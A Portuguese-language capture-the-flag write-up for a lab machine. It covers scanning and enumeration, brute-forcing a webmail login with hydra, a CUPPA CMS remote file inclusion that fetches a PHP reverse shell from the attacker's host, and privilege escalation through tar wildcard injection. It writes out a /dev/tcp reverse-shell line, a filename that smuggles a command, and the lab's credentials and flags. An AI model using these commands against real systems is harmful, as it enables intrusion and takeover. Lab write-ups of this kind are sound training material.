# SCANNING
Com o comando 
```Kali
sudo nmap -A -Pn -T5 -v 10.10.76.34
```
iniciamos o escaneamento mais abrangente, sem realizar o PING, nas 1000 portas comum, de forma agressiva
![Descrição da Imagem](https://github.com/r0s3mbr1ck/WriteUps/blob/main/Images/Pasted%20image%2020250131173426.png)
## Informações Levantadas
**Portas Abertas**: 22, rodando um serviço SSH OpenSSH 7.2p2 Ubuntu 4ubuntu2.7
			80, rodando um serviço WEB Apache httpd 2.4.18
			110, rodando um serviço de email POP3 Dovecot pop3d
			139, rodando um serviço
			143, rodando um serviço de email Dovecot imapd
			445, , rodando um serviço Samba 4.3.11
**SO**: Ubuntu 4.4
# Enumeração
Ao acessar o serviço WEB encontramos uma página mas sem formas de exploração aparente
![Descrição da Imagem](https://github.com/r0s3mbr1ck/WriteUps/blob/main/Images/Pasted%20image%2020250211172518.png)

Realizamos então a enumeração do serviço SMB e descobrimos algumas coisas interessantes
```Kali
enum4linux -a 10.10.255.32
```
![Descrição da Imagem](https://github.com/r0s3mbr1ck/WriteUps/blob/main/Images/Pasted%20image%2020250211172131.png)
Conseguimos conectar no compartilhamento anonymous e identificamos um arquivo de log, que parece ser uma wordlist
```Kali
smbclient //10.10.255.32/anonymous -N
```
![Descrição da Imagem](https://github.com/r0s3mbr1ck/WriteUps/blob/main/Images/Pasted%20image%2020250211172249.png)
![Descrição da Imagem](https://github.com/r0s3mbr1ck/WriteUps/blob/main/Images/Pasted%20image%2020250211132254.png)
![[Pasted image 20250211172249.png]]
![[Pasted image 20250211132254.png]]
Realizamos a enumeração do serviço WEB com o **gobuster** e identificamos um serviço de email

```Kali
gobuster dir -u http://10.10.255.32 -w /usr/share/wordlists/dirb/big.txt
```
![Descrição da Imagem](https://github.com/r0s3mbr1ck/WriteUps/blob/main/Images/Pasted%20image%2020250211132115.png)
![[Pasted image 20250211132115.png]]
![Descrição da Imagem](https://github.com/r0s3mbr1ck/WriteUps/blob/main/Images/Pasted%20image%2020250211125256.png)
![[Pasted image 20250211125256.png]]
# Exploração
Tentaremos descobrir a credencial do usuário milesdyson (nome de um compartilhamento) com a wordlist encontrada em log1 com o **hydra**, utilizando o **Burp Suite** para analisar a requisição e montar a sintaxe
```Kali
hydra -l milesdyson -P /home/rosembrick/log1.txt 10.10.255.32 http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:F=Unknown user or password incorrect" -v -T64 -I
```
![Descrição da Imagem](https://github.com/r0s3mbr1ck/WriteUps/blob/main/Images/Pasted%20image%2020250211125533.png)
![[Pasted image 20250211125533.png]]
![Descrição da Imagem](https://github.com/r0s3mbr1ck/WriteUps/blob/main/Images/Pasted%20image%2020250211125612.png)
![[Pasted image 20250211125612.png]]

Após a tentativa, descobrimos a credencial e assim obtivemos acesso ao serviço de email
![Descrição da Imagem](https://github.com/r0s3mbr1ck/WriteUps/blob/main/Images/Pasted%20image%2020250211124948.png)
![[Pasted image 20250211124948.png]]
login: milesdyson   password: cyborg007haloterminator
Numa das primeiras mensagens, há uma senha do serviço SMB possivelmente
![Descrição da Imagem](https://github.com/r0s3mbr1ck/WriteUps/blob/main/Images/Pasted%20image%2020250211125214.png)
![[Pasted image 20250211125214.png]]

Conseguimos acesso ao compartilhamento do usuário milesdyson e obtemos acesso a um arquivo importante, chamado importan.txt com suposto diretório
![Descrição da Imagem](https://github.com/r0s3mbr1ck/WriteUps/blob/main/Images/Pasted%20image%2020250211125717.png)
![[Pasted image 20250211125717.png]]
![Descrição da Imagem](https://github.com/r0s3mbr1ck/WriteUps/blob/main/Images/Pasted%20image%2020250211125803.png)
![[Pasted image 20250211125803.png]]
Ao acessarmos o diretório encontramos esta página e assim, tentamos mais uma vez enumerar com o **gobuster**
![Descrição da Imagem](https://github.com/r0s3mbr1ck/WriteUps/blob/main/Images/Pasted%20image%202025021125822.png)
![[Pasted image 20250211125822.png]]
Com o comando abaixo, identificamos uma página de login
```Kali
gobuster dir -u http://10.10.255.32/45kra24zxs28v3yd -w /usr/share/wordlists/dirb/big.txt
```
![Descrição da Imagem](https://github.com/r0s3mbr1ck/WriteUps/blob/main/Images/Pasted%20image%2020250211125057.png)
![[Pasted image 20250211125057.png]]
![Descrição da Imagem](https://github.com/r0s3mbr1ck/WriteUps/blob/main/Images/Pasted%20image%2020250211125924.png)
![[Pasted image 20250211125924.png]]
Procuramos por exploits que explorem o serviço CUPPA CMS e identificamos um exploit para executar um RFI
![Descrição da Imagem](https://github.com/r0s3mbr1ck/WriteUps/blob/main/Images/Pasted%20image%2020250211125443.png)
![[Pasted image 20250211125443.png]]
Preparamos nosso exploit conforme descrição do script, alterando para o nosso host conforme se segue
![Descrição da Imagem](https://github.com/r0s3mbr1ck/WriteUps/blob/main/Images/Pasted%20image%2020250211130055.png)
![[Pasted image 20250211130055.png]]
Com um listener aberto no Kali e um servidor Python para que o alvo se conecte e faça o dowload do nosso reverse shell por PHP, acessamos a página abaixo
http://10.10.255.32/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.23.22.193:443/exploit_php.php
![Descrição da Imagem](https://github.com/r0s3mbr1ck/WriteUps/blob/main/Images/Pasted%20image%2020250211125334.png)
![[Pasted image 20250211125334.png]]
E assim, conseguimos acesso ao alvo pelo usuário www-data.
![Descrição da Imagem](https://github.com/r0s3mbr1ck/WriteUps/blob/main/Images/Pasted%20image%2020250211124851.png)
![[Pasted image 20250211124851.png]]
Capturamos a flag do user
![Descrição da Imagem](https://github.com/r0s3mbr1ck/WriteUps/blob/main/Images/Pasted%20image%2020250211131725.png)
![[Pasted image 20250211131725.png]]
**user:** 7ce5c2109a40f958099283600a9ae807
# Escalação de Privilégio
Realizamos uma enumeração interna com **linpeas.sh** baixado por um servidor python do nosso Kali
![Descrição da Imagem](https://github.com/r0s3mbr1ck/WriteUps/blob/main/Images/Pasted%20image%2020250211132021.png)
![[Pasted image 20250211132021.png]]
E identificamos esse script que realiza backup a cada 1 min com a ferramenta **tar**, passível de explorarmos para escalarmos privilégio
![Descrição da Imagem](https://github.com/r0s3mbr1ck/WriteUps/blob/main/Images/Pasted%20image%2020250211124302.png)
![[Pasted image 20250211124302.png]]
![Descrição da Imagem](https://github.com/r0s3mbr1ck/WriteUps/blob/main/Images/Pasted%20image%2020250211124424.png)
![[Pasted image 20250211124424.png]]
Verificamos que o binário **tar** executa um comando em cada ponto de verificação do backup
![Descrição da Imagem](https://github.com/r0s3mbr1ck/WriteUps/blob/main/Images/Pasted%20image%2020250211124600.png)
![[Pasted image 20250211124600.png]]
Para isso preparamos nosso script para escalarmos para root com o comando abaixo
![Descrição da Imagem](https://github.com/r0s3mbr1ck/WriteUps/blob/main/Images/Pasted%20image%2020250211130324.png)
![[Pasted image 20250211130324.png]]

```Kali
echo '#!/bin/bash > root_shell.sh
```
```Kali
echo 'bash -i >& /dev/tcp/10.23.22.193/4445 0>&1' >> root_shell.sh
```
Agora criaremos um **arquivo** chamado `--checkpoint-action=exec=bash root_shell.sh`, contendo o texto `/var/www/html` para que o `tar` executado dentro desse diretório, use o `--checkpoint`, e assim executar o nosso shell reverso `root_shell.sh`.
```Kali
echo "/var/www/html"  > "--checkpoint-action=exec=bash root_shell.sh"
```
![Descrição da Imagem](https://github.com/r0s3mbr1ck/WriteUps/blob/main/Images/Pasted%20image%2020250211130505.png)
![[Pasted image 20250211130505.png]]
Como o arquivo inicial `/home/milesdyson/backups/backup.sh`executa o binário **tar** a cada minuto, receberemos a shell de root em 1 minuto conforme abaixo.
![Descrição da Imagem](https://github.com/r0s3mbr1ck/WriteUps/blob/main/Images/Pasted%20image%2020250211131601.png)
![[Pasted image 20250211131601.png]]
Já com acesso ao root, capturamos a flag de root
![Descrição da Imagem](https://github.com/r0s3mbr1ck/WriteUps/blob/main/Images/Pasted%20image%2020250211131643.png)
![[Pasted image 20250211131643.png]]

**root:** 3f0372db24753accc7179a282cd6a949

